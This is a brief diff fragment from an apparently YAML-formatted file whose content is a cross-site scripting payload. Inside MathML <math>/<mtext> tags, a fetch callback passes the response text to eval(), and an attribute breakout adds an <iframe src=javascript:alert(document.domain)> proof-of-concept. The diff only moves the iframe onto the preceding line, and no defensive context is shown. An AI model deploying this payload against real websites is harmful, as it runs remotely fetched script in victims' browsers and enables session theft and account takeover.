@@ -9,8 +9,7 @@ info:
                         res.text().then(function(data){
                           eval(data)
                         })
-                      })>'><s>ssss</s>
-<iframe src=javascript:alert(document.domain)>
+                      })>'><s>ssss</s><iframe src=javascript:alert(document.domain)>
       </mtext>
     </math>
   version: production
